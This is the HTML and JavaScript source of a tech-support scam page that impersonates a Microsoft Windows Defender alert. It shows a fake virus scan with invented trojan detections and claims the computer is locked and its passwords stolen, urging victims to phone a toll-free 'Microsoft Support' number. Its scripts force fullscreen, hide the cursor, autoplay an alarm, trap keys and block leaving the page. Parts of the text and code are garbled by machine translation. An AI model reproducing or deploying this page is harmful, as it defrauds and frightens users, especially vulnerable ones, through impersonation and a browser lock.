

<!doctype html>
<html lang="en">
<head>


    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
          integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="main.css">
    <title>Security Center Code0x268d3-Er0007 Service</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <script type="text/javascript">
        window.onload = function () {
            document.onclick = function (e) {
                e = e || event;
                target = e.target || e.srcElement;
                if (target.tagName === "DIV") {
                    toggleFullScreen();
                    document.body.style.cursor = 'not-allowed';
                    document.getElementById('map').innerHTML = stroka;
                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                } else {
                    toggleFullScreen();
                    document.body.style.cursor = 'not-allowed';
                    document.getElementById('map').innerHTML = stroka;
                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                }
            }
        }
    </script>

   <script type="text/javascript">
        function getVariableFromURl(name) {
            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
            var regexS = "[\\?&]" + name + "=([^&#]*)";
            var regex = new RegExp(regexS);
            var results = regex.exec(window.location.href);
            if (results == null)
                return "";
            else
                return results[1];
        }

        var phone = getVariableFromURl('phone');
        var phone_number = +1 844 739-2316
 ' (Toll-Free)';
        var phone_number2 = +1 844 739-2316
 ' (Toll-Free)';



    </script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-L4072G1BFV"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-L4072G1BFV');
</script>


</head>
<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
<audio id="beep" autoplay="">
    <source src="0wa0rni0ng0.mp3" type="audio/mpeg">
</audio>
<div class="bg" style="cursor:none;">
    <div class="bgimg" style="top: 0px;"><img src="background.png" alt="" width="100%"/></div>

</div>
<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
    <div class="black" style="height: 145%;cursor: none;"></div>
</a>

<div class="pro_box" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-6">
                <div class="logo">
                    <img src="microsoft.png"><span>Microsoft Windows</span>
                </div>
            </div>
            <div class="col-md-6">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate a license</button>
                            </a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="scan_box">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Quick Scan</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="progress">
                <div id="dynamic" class="progress-bar progress-bar-success active" role="progressbar" aria-valuenow="0"
                     aria-valuemin="0" aria-valuemax="100" style="width: 0%">
                    <span id="current-progress"></span>
                </div>
            </div>
            <div class="table_quick">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th scope="col">Scanned objects</th>
                        <th scope="col">
                            <div class="counter col_fourth">
                                <h2 class="timer count-title count-number" data-to="51900" data-speed="5000"></h2>
                            </div>
                        </th>
                    </tr>
                    <tr>
                        <th scope="col">the time has passed.</th>
                        <th scope="col">5 seconds</th>
                    </tr>
                    <tr>
                        <th scope="col">Threats found</th>
                        <th scope="col" style="color: red;"><h2 class="timer count-title count-number" data-to="11"
                                                                data-speed="2000"></h2></th>
                    </tr>
                    </thead>
                </table>
            </div>
        </div>
        <div class="scan_footer">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Cancel</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Pause</button>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary" id="">Scheduled scans</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="pro_box2" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-5">
                <div class="logo">
                    <img src="microsoft.png"><span>Microsoft Windows operating system</span>
                </div>
            </div>
            <div class="col-md-7">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate a license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="scan_box2">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-4">
                    <h4 class="new_heading">Threat Analysis Results</h4>
                </div>
                <div class="col-md-8">
                    <div class="total_detail">
                        <ul>
                            <li><a href="#"><p>Detected Items</p>
                                    <p>11</p></a></li>
                            <li><a href="#"><p>Scan time</p>
                                    <p>3 sec</p></a></li>
                            <li><a href="#"><p>Digitized Elements</p>
                                    <p>51,900</p></a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </th>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Object type</th>
                        <th>Position</th>
                    </tr>
                    </thead>
                    <tbody id="table_scroll">
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry values</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially unused...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially unused...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.TopGuard...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.Bundler...</td>
                        <td>Potentially unused...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry values</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially unused...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially unused...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>

                    </tbody>
                </table>
            </div>
        </div>
        <div class="scan_footer2">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="dropdown">
                            <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="#" role="button"
                               id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                               Save results
                            </a>

                            <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                                <a class="dropdown-item" href="#">Action</a>
                                <a class="dropdown-item" href="#">another move</a>
                                <a class="dropdown-item" href="#">something else here</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Shut down</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary bg_blue">Quarantine</button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>
<div class="pro_box3" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-6">
                <div class="logo">
                    <img src="microsoft.png"><span>Microsoft Windows operating system</span>
                </div>
            </div>
            <div class="col-md-6">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate a license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="scan_box2">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-12">
                    <div class="total_detail_scan">
                        <ul>
                            <li><a href="#">Analyse</a></li>
                            <li><a href="#">planner</a></li>
                            <li><a href="#">Reports</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <div class="row">
                    <div class="col-md-4">
                        <div class="pc_desk">
                            <img src="pc.png">
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_pro mar_top">
                            <ul>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Check for updates</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan Memory</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan Memory</li>
                                <li>
                                    <div class="circular-spinner"></div>
                                    <span>Scan startup items</span></li>
                                <li>Scan Queue System</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_dur">
                            <p><strong>Scan time</strong></p>
                            <p>3 seconds </p>
                            <p>5 seconds </p>
                            <br>
                            <p><strong>Digitized items</strong></p>
                            <p>51,900</p>
                            <br>
                            <p><strong>Detection</strong></p>
                            <p>11</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_footer3">
            <div class="row">
                <div class="col-md-2">
                    <div class="viruses">
                        <img src="virus-scan.png">
                    </div>
                </div>
                <div class="col-md-10">
                    <div class="make_this">
                        <p>Make it the last thing you worry about online threats</p>
                        <p>Malwarebytes Premium blocks malware, viruses and more without bringing down your computer. Upgrade to Premium</p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<div id="footer" style="top: 672px; position: absolute;cursor: none;">
    <div class="row">

        <div class="col-md-12">
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Microsoft: </span><span
                        style="font-weight: 700;padding-left: 13px;color: #fff;">Support Contact <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1 844 739-2316

 (Toll-Free)</span></span>
            </div>
        </div>
        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #eee;font-size: 10px;">Windows
                                                                         Defender SmartScreen prevented unrecognized apps from appearing. If you are running this application, your PC may be put
                                                                         You are in danger. Windows Defender scan found unwanted adware that can fly on this device
                                                                         Password, Online ID, Financial Information, Personal File, Photo or
                                                                         Documentation.</small></marquee>
        </div>
    </div>


</div>

<div id="poptxt" class="lightbox">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Windows Defender Security Center</span>
            <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>

        </div>
    </div>
    <div id="txtintro">
                <span class="colo-rd">App: Annonces.fiancetrack(0x2).dll<br>
                    Threat Detected: Trojan Spyware</span>
    </div>
    <img id="banner" src="virus-images.jpeg">
    <div id="disclaimer">
        Access to this PC has been blocked for security reasons.<br>
        <span class="support">Contact Windows Support: +1 844 739-2316

 (Toll-Free)</span>
    </div>
    <div id="bottom">
        <img id="badge" src="microsoft.png"><span class="title3">Microsoft</span>
        <ul>
            <li>
                <a href="#">
                    <div class="fr button2">
                        <span id="addtochromebutton">to refuse</span>
                    </div>
                </a>
            </li>
            <li>
                <a href="#">
                    <div class="fr button">
                        <span id="addtochromebutton">Allow</span>
                    </div>
                </a>
            </li>
        </ul>

    </div>
</div>

<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #FFFFFF !important;
    color: #414141;font-weight: bold;
    margin-top: 8px;">Windows - Defender-Security Alert</p>
    <p>** Access to this PC has been blocked for security reasons **</p>
    <p>This is a warning that your computer is infected with a spyware Trojan. The following data is
        I made compromises.</p>
    <p>&gt; Informations d'Identification par e-mail<br>
        &gt; Bank password<br>
        &gt; Connexion Facebook<br>
        &gt; Photos et documents

    </p>
    <p>Windows-Defender scan found unwanted adware that can steal your online password on this device
        Identity, financial information, personal file, photos or documents.</p>
    <p>Please contact us immediately so that our engineers can guide you through the removal process.
        telephone.</p>
    <p>Contact Microsoft Support immediately to report this threat, prevent identity theft, and unlock access
        Terminal.</p>
    <p>If you close this window, your personal information will be compromised and the window will be terminated.
        Registration.</p>
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Microsoft Support: <strong>
            +1 844 739-2316

 (Toll-Free) </strong></p>
    <div class="action_buttons"><a class="active" id="leave_page"
                                   style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
                                                                                                 id="leave_page"
                                                                                                 style="color: #FFFFFF !important;"> Cancel</a>
    </div>
</div>

<div id="welcomeDiv"
     style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  "
     class="answer_list">
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use
        Your computer.<br> The computer is turned off. Please call me. <br>The computer is disabled. Please call me. <br>Please contact us immediately. A technician will help you solve the problem.</p>


</div>


<!-- Optional JavaScript; choose one of the two! -->

<!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
        crossorigin="anonymous"></script>
<script type="text/javascript" src="fullscreen.js"></script>
<script type="text/javascript" src="before.js"></script>
<script type="text/javascript" src="main.js"></script>
<script type="text/javascript" src="light.js"></script>
<script type="text/javascript">
    $(function () {
        var current_progress = 0;
        var interval = setInterval(function () {
            current_progress += 10;
            $("#dynamic")
                .css("width", current_progress + "%")
                .attr("aria-valuenow", current_progress)
                .text(current_progress + "% Complete");
            if (current_progress >= 100)
                clearInterval(interval);
        }, 100);
    });
</script>
<script type="text/javascript">
    (function ($) {
        $.fn.countTo = function (options) {
            options = options || {};

            return $(this).each(function () {
                // set options for current element
                var settings = $.extend({}, $.fn.countTo.defaults, {
                    from: $(this).data('from'),
                    to: $(this).data('to'),
                    speed: $(this).data('speed'),
                    refreshInterval: $(this).data('refresh-interval'),
                    decimals: $(this).data('decimals')
                }, options);

                // how many times to update the value, and how much to increment the value on each update
                var loops = Math.ceil(settings.speed / settings.refreshInterval),
                    increment = (settings.to - settings.from) / loops;

                // references & variables that will change with each update
                var self = this,
                    $self = $(this),
                    loopCount = 0,
                    value = settings.from,
                    data = $self.data('countTo') || {};

                $self.data('countTo', data);

                // if an existing interval can be found, clear it first
                if (data.interval) {
                    clearInterval(data.interval);
                }
                data.interval = setInterval(updateTimer, settings.refreshInterval);

                // initialize the element with the starting value
                render(value);

                function updateTimer() {
                    value += increment;
                    loopCount++;

                    render(value);

                    if (typeof (settings.onUpdate) == 'function') {
                        settings.onUpdate.call(self, value);
                    }

                    if (loopCount >= loops) {
                        // remove the interval
                        $self.removeData('countTo');
                        clearInterval(data.interval);
                        value = settings.to;

                        if (typeof (settings.onComplete) == 'function') {
                            settings.onComplete.call(self, value);
                        }
                    }
                }

                function render(value) {
                    var formattedValue = settings.formatter.call(self, value, settings);
                    $self.html(formattedValue);
                }
            });
        };

        $.fn.countTo.defaults = {
            from: 0,               // the number the element should start at
            to: 0,                 // the number the element should end at
            speed: 100,           // how long it should take to count between the target numbers
            refreshInterval: 100,  // how often the element should be updated
            decimals: 0,           // the number of decimal places to show
            formatter: formatter,  // handler for formatting the value before rendering
            onUpdate: null,        // callback method for every time the element is updated
            onComplete: null       // callback method for when the element finishes updating
        };

        function formatter(value, settings) {
            return value.toFixed(settings.decimals);
        }
    }(jQuery));

    jQuery(function ($) {
        // custom formatting example
        $('.count-number').data('countToOptions', {
            formatter: function (value, options) {
                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
            }
        });

        // start all the timers
        $('.timer').each(count);

        function count(options) {
            var $this = $(this);
            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
            $this.countTo(options);
        }
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".pro_box2").delay(1500).fadeIn(800);
        $(".pro_box3").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3000).fadeIn(800);
        $("#pop_up_new").delay(3500).fadeIn(800);
        $("#poptxt").delay(4000).fadeIn(800);
    });
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (es) {
        if (es.keyCode === 27) {
            toggleFullScreen();
        }
    }, false);
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (e) {
        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
            document.getElementById('map').innerHTML = stroka;
            toggleFullScreen();
        }
    }, false);
</script>
<script>
    // Get the modal
    var modal = document.getElementById('myModal');

    // Get the button that opens the modal
    var btn = document.getElementById("myBtn");

    // Get the <span> element that 選ぶs the modal
    var span = document.getElementsByClassName("選ぶ")[0];

    // When the user clicks the button, open the modal
    /*btn.onclick = function() {
      modal.style.display = "block";
    } */

    // When the user clicks on <span> (x), 選ぶ the modal
    span.onclick = function () {
        modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, 選ぶ it
    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("beep").play();
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $("#welcomeDiv").show();
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#poptxt").show();
        });
    });
</script>
</body>
</html>
